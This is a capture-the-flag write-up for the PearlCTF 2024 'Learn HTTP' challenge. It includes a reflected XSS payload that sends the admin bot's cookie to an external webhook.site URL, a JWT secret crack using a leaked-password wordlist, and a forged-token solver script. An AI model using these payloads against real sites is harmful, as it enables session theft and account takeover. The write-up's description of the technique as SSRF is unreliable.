PearlCTF 2024
===

## Learn HTTP

>[!Note]
Reflected XSS, SSRF, JWT Token


I made a simple web application to teach you guys how HTTP responses work, I hope you enjoy :)

url: https://learn-http.ctf.pearlctf.in

Probset gave the source code of the app and the link to the their web app.



### Enumerate

On image 1, the web app have the intention to give the client what response of web they want. It have three main points on the index:

1. HTTP response
2. link to the http response
3. admin checker
![image](https://hackmd.io/_uploads/S1bS5h4jA.png)





#### Check Response

Try if it allow any HTML or XSS injection with the following payload and it will provide you with the alert mean that it success and can inject reflected XSS into the response.

```url
https://learn-http.ctf.pearlctf.in/resp?body=<script>alert(1);</script>
```



#### Check Source Code

Look up on the source code (image 2), there are also three main parts, which is **bot.js, main.go,** and **main.js**&#x20;


![image](https://hackmd.io/_uploads/Byzv5nEsC.png)

In **main.js**, I found it has 3 route: **/**, **/check**, and **/flag.** Some focus point on this snippet source code is:

* **genToken**: remember **jwt** (JSON Web Token) pattern.
* in route **/check**, it spawn **bot.js** and give **url** and **token** data to it. Should check the **bot.js** file
* in route **/flag**, it will check whether the **id** is **2** or not, indicate that we must edit the token.


- main.js
```javascript
...
const genToken = () => {
    var token = jwt.sign({ id: 1 }, process.env.SECRET);
    return token
}

app.post("/check", (req, res) => {
    try {
        let req_body = req.body.body
        
        if (req_body == undefined) {
            return res.status(200).send("Body is not provided")
        }

        let to_req = `http://localhost:5001/resp?body=${encodeURIComponent(req_body)}`

        childProcess.spawn('node', ['./bot.js', JSON.stringify({
            url: to_req,
            token: genToken()
        })]);

        return res.status(200).send("Admin will check!")
    } catch (e) {
        console.log(e)
        return res.status(500).send("Internal Server Error")
    }
})

<strong>app.get("/flag", (req, res) => {
</strong>    let token = req.cookies.token
    try {
        var decoded = jwt.verify(token, process.env.SECRET)
        if (decoded.id != 2) {
            return res.status(200).send("You are not verified")
        }

        return res.status(200).send(process.env.FLAG)
    } catch {
        return res.status(200).send("You are not verified")
    }
})

app.listen("5000", () => {
    console.log("Server started")
})
...

```


In **bot.js**, the page will set some cookie with name **token** and it **JWT** token values. It also have the timeout around 3 hours before the token expired.&#x20;

- bot.js
```javascript
...
let page = await browser.newPage();
		await page.setCookie({
			name: 'token',
			value: token,
			domain: 'localhost',
			httpOnly: false,
			secure: true,
			sameSite: 'None'
		});
		await page.goto(url,{ waitUntil: 'domcontentloaded', timeout: 3000 });
		await new Promise(r=>setTimeout(r,10000));
...
```


### Conclusion

From here, I concluded that the concept is to retrieve the token from local so we can use the token to gain access to the **/flag.** This attack called **SSRF** ( Server-Side Request Forgery) where web security vulnerability allow attacker to cause server-side application to make requests to the unintended location ([Portswigger](https://portswigger.net/web-security/ssrf)).



### Exploit

Search some reflected XSS payload from:

url: https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md

The payload and additional webhook to catch the cookies (I remove the alert on the full payload).

```javascript
<script>
alert(document.cookie);
var i=new Image;
i.src="webhook.site//?"+document.cookie;
</script>

```



since on the payload must include the URL encoding, here the full payload to catch the token:

```url
https://learn-http.ctf.pearlctf.in/resp?body=HTTP%2F1.1%20200%20OK%0D%0A%0D%0A<script>var%20i=new%20Image;i.src="https://webhook.site/da7f2c82-e06f-47ba-b2f8-9b22c747da15?"%2bdocument.cookie;</script>
```



After setting up webhook and sent the payload, I got the feedback on webhook indicate that it succeed captured the cookies named **token** and it values.

![image](https://hackmd.io/_uploads/HkcHsnEiA.png)


Analyze the last endpoint to get the flag. The token contain JWT and in line 5 the token will verify the JWT authentication between the token and the **SECRET** they provided for JWT. In line 6, it has a checker that the **id** must be valued with **2**.

* [ ] need to know the **SECRET** from the JWT token.
* [ ] need to change the **id** value to **2** without broke the auth token.

- main.js
```javascript
...
app.get("/flag", (req, res) => {
    let token = req.cookies.token
    try {
        var decoded = jwt.verify(token, process.env.SECRET)
        if (decoded.id != 2) {
            return res.status(200).send("You are not verified")
        }

        return res.status(200).send(process.env.FLAG)
    } catch {
        return res.status(200).send("You are not verified")
    }
})
...
```

Here JWT Token Concept where it made of **Header**, **Payload**, and **Secret** so it will become **Signature** and be a **JWT** token. To decode, need the **Secret** to keep authentication of the token.

![image](https://hackmd.io/_uploads/H1RnohVoC.png)

To deal with it, I use [JWT token cracker](https://github.com/lmammino/jwt-cracker?tab=readme-ov-file) to obtain the S**ecret** and use [this website](https://jwt.io/#debugger-io) (jwt.io) to change the value of JWT token's **id** and try to "keep" the token auth is real (spoof).



- tool, wordlist, and payload
```bash
jwt-cracker -t thetoken -d /usr/share/seclists/Passwords/darkweb2017-top10000.txt 

```


![image](https://hackmd.io/_uploads/HJTbh2NjR.png)

use the **Secret** on the **Signature** part and change the **id** to **2** so it can pass the checker.

![image](https://hackmd.io/_uploads/SJoyhhEsA.png)


### Code Solver

```python

import requests

url = "https://learn-http.ctf.pearlctf.in/flag"

params={
    "host":"http://localhost:5001/"
}

cookies={
    "token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNzA5OTg0NDU5fQ.TgOMUwqpP3P34lFfu9eAiNPZFrNvkF7gAawQacOzPyc"
}

res = requests.get(url,cookies=cookies,params=params)

print(res.text)

```

:::success
**pearl{c4nt\_s3nd\_th3\_resP0n53\_w1th0ut\_Sani7iz1ng}**
:::



